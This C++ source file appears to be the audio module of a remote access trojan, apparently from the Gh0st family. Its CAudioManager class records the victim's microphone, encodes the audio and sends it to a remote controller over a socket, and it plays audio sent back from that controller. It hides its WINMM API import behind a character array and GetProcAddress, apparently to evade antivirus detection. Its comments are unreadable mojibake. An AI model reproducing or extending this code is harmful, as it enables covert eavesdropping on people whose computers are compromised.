// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////
#include "../StdAfx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "AudioManager.h"
#include "../../common/AudioCode.h"
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;

//////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////
bool CAudioManager::m_bIsWorking = false;

CWaveIn g_WaveIn;
CWaveOut g_WaveOut;
CAudioCode g_ACode;

char m_cBufln[1024];
char m_cBufOut[1024];

HANDLE g_hEvent;
DWORD ReaiLen =0;
char *Readata = 0;
HANDLE	m_hEventWaveIn; // MM_WIM_DATA����

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	if (!Initialize())
		return;

	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);

	Sleep(1500);
	m_hEventWaveIn	= CreateEventA(NULL, false, false, NULL);

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, NULL, NULL);

	g_WaveIn.StartRec();  //����¼��
	g_WaveOut.StartPlay();  //������������

}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = false;

	CloseHandle(g_hEvent);  //
	g_WaveIn.StopRec();     //ֹͣ¼��
	g_WaveOut.StopPlay();   //ֹͣ��������

	CloseHandle(m_hEventWaveIn);

//	CloseHandle(m_hEventExit);  //�˳������¼�
//	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,true,"AudioManager"); 
//    ResetEvent(m_hEventExit);
//	MessageBox(NULL, "����ģ���˳�", "��ʾ����", MB_OK);
//	CreateEvent(NULL,TRUE,NULL,NULL); //���߳�ʼ�����ź�״̬

//	delete	m_lpAudio;
}

bool CAudioManager::Initialize()
{
	char NqgmG05[] = {'w','a','v','e','I','n','G','e','t','N','u','m','D','e','v','s','\0'};
	waveInGetNumDevsT pwaveInGetNumDevs=(waveInGetNumDevsT)GetProcAddress(LoadLibrary("WINMM.dll"),NqgmG05);
	if (!pwaveInGetNumDevs())
		return false;

	// ����ʹ����.. ��ֹ�ظ�ʹ��
	if (m_bIsWorking)
		return false;

	m_bIsWorking = true;
	return true;
}

int CAudioManager::sendRecordBuffer()  //�������뷢��
{

	DWORD	dwBytes = 0;
	char *lpBuffer = 0;

    WaitForSingleObject(m_hEventWaveIn, INFINITE);   //�ȴ���Ƶ���ݵ���
	if(ReaiLen == NULL)
		return 0;

	lpBuffer = Readata;
	dwBytes = ReaiLen;
	ReaiLen = 0;

	//��Ƶ���뺯��
	int lin = sizeof(m_cBufln);
	g_ACode.EncodeAudioData (lpBuffer,dwBytes,m_cBufln,&lin);

	LPBYTE	lpPacket = new BYTE[lin + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;
	Gyfunction->my_memcpy(lpPacket + 1, m_cBufln, lin);

	Send(lpPacket,lin+1);
	delete	lpPacket;

	return 0;
}

void CAudioManager::OnReceive( LPBYTE lpBuffer, UINT nSize )
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
/*	// ���ȵ�����Ƶ���������������
	char m_cOut[1024];
	int iOut;
	iOut = sizeof(m_cOut);
	g_ACode.DecodeAudioData ((char *)lpBuffer, nSize,m_cOut,&iOut);
	m_lpAudio->playBuffer((unsigned char *)m_cOut,iOut);
	*/

	//��Ƶ���뺯��
	int lOut = sizeof(m_cBufOut);
	g_ACode.DecodeAudioData ((char *)lpBuffer, nSize,m_cBufOut,&lOut);
	g_WaveOut.Play(m_cBufOut,lOut);   //��Ϣ����

}

DWORD WINAPI CAudioManager::WorkThread( LPVOID lparam )   //��Ͳ���������߳�
{
	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bIsWorking)
			pThis->sendRecordBuffer();

	return -1;
}

void CAudioManager::ReadGetData(char *pBuffer,int iLen)  //��Ͳ����ת��
{
	Readata = (char *)pBuffer;
	ReaiLen = iLen;

	SetEvent(m_hEventWaveIn);// ֪ͨ�����Ѿ�����
}